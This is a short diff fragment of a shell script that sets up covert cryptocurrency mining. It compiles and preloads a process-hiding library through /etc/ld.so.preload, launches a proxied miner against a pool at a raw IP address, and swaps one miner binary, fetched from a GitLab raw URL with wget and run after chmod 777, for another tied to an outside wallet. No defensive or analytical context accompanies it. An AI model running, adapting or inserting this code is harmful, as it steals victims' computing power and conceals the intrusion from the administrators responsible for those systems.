@@ -57,5 +57,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.84 --algo KARLSEN --pool 159.203.127.146:80 --user nexellia:qrdgwjq2mydwswum0rkdlxgnyelamst53wxcj3dlc3z9jhx67745kmfzjk0rz.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
-chmod 777 b && ./b -o 161.35.141.255:80 -u amyKwSEvRSVaTi1UiyKnrk9pQWasrEeX3ApiMtzFFfUL8Y8HAfaHX6bRnc9XjZnfUhVccifsw1FCx32ogbB2gWUN1NxxLdd7jc -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1
+./graftcp/graftcp ./lol1.84 --algo KARLSEN --pool 159.203.127.146:80 --user nexellia:qrdgwjq2mydwswum0rkdlxgnyelamst53wxcj3dlc3z9jhx67745kmfzjk0rz.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
+chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.12.20:80 -u v255vQEQnZj2NVjF3UHpTrtwA1cGdXt4dV.$(shuf -n 1 -i 1-99999)-VISH -t4
